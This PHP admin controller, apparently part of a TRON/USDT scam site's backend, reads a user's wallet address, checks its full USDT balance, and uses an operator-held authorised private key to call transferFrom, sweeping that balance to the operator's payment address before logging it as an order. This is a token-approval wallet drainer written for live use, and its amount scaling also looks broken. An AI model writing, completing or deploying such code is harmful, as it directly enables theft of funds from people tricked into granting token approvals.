<?php
namespace app\admin\controller;
use app\common\model\TroniModel;
use IEXBase\TronAPI\Provider\HttpProvider;
use IEXBase\TronAPI\Tron;
use IEXBase\TronAPI\Exception\TronException;
use IEXBase\TronAPI\Support\Utils;
use app\common\lib\Respons;
use think\facade\Db;
use think\facade\Session;
use think\facade\View;
use think\facade\Request;

class Troni
{	
    protected $middleware = ['adminCheckLogin',"Language"];
    //列表
    public function index(){
        $param = Request::param();
        $id = isset($param['id'])?intval($param['id']):0;
        if(empty($id)){
            return Respons::run(0,[],lang('非法参数'));
        }
        $config = Db::name('troni_set')->where("1=1")->find();
        if(empty($config)){
            return Respons::run(0,[],lang('参数未配置，请联系管理员'));
        }
        $info = TroniModel::where(["id" => $id])->find();
        if(empty($info)){
            return Respons::run(0,[],lang('非法参数,数据不存在'));
        }
        $from_address = $info['address'];
        $uid = $info['uid'];
        $is_demo = $config['is_demo'];
        $this->node = $is_demo ? "https://api.shasta.trongrid.io" : "https://api.trongrid.io";
        $fullNode = new HttpProvider($this->node);
        $solidityNode = new HttpProvider($this->node);
        $eventServer = new HttpProvider($this->node);
        $abi = config("abi");
        $rsps = [];
        $rsps['code']=0;
        try {
            $tron = new Tron($fullNode, $solidityNode, $eventServer);
            
            $approve = $config['approve'];  // 授权地址
            $privateKey = $config['privateKey']; // 授权私钥
            $from = $from_address;  // 用户钱包地址
            $to = $config['payment_address'];  // 收款钱包地址
            $usdtTrc20ContractAddress = $is_demo ? 'TRjZQTqw64eNhyg7udS8E6U2DAo87ByW4N' : 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t';
            /* 获取用户USDT 余额 */
            $contrace = $tron->contract($usdtTrc20ContractAddress);
            $money = $contrace->balanceOf($from);
            $tron->setPrivateKey($privateKey);
            $tron->setAddress($approve);
            $balance = $tron->getBalance(null, true); // 获取授权账户TRX 余额 
            $feeLimit = 10000000;
            if($balance < 10){
                throw new \Exception(lang("授权账户余额不足"), 1);
            }            
            $sun = 10000000000;
            $amount = $money * $sun;
            
            $transfer = $tron->getTransactionBuilder()->triggerSmartContract($abi, 
                $tron->address2HexString($usdtTrc20ContractAddress),
                "transferFrom",
                [
                    $tron->address2HexString($from),
                    $tron->address2HexString($to),
                    $amount
                ],
                $feeLimit,
                $tron->address2HexString($approve)
            );
            
            $signedTransaction = $tron->signTransaction($transfer);
            $response = $tron->sendRawTransaction($signedTransaction);
            $ret = array_merge($response, $signedTransaction);
            if(isset($ret['result']) && $ret['result'] === true){
                $data = [];
                $data['uid'] = $uid;
                $data['address'] = $from;
                $data['address1'] = $to;
                $data['trade_no'] = $ret['txid'];
                $data['money'] = $money;
                $data['add_time'] = time();
                $data['update_time'] = time();
                Db::name('troni_order')->insertGetId($data);
                $rsps['code']=1;
            }
        } catch (TronException $e) {
            $rsps['msg'] = $e->getMessage();
        }
        
        return Respons::run($rsps);
    }

}
